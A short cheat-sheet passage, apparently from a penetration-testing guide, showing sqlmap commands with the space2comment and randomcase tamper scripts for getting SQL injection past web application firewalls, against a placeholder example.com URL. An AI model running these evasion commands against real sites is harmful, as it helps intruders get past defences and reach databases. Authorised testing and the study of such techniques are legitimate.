# Advanced SQLmap: Evading Firewalls (WAF)

Techniques to slip past Web Application Firewalls and Intrusion Detection Systems.

## 1. Obfuscate Payload Using Tamper Scripts
```bash
# Convert spaces to inline comments to bypass simple keyword detection
sqlmap -u "[http://example.com/id=1](http://example.com/id=1)" --tamper=space2comment

# Randomize character casing (e.g., select -> sElEcT)
sqlmap -u "[http://example.com/id=1](http://example.com/id=1)" --tamper=randomcase
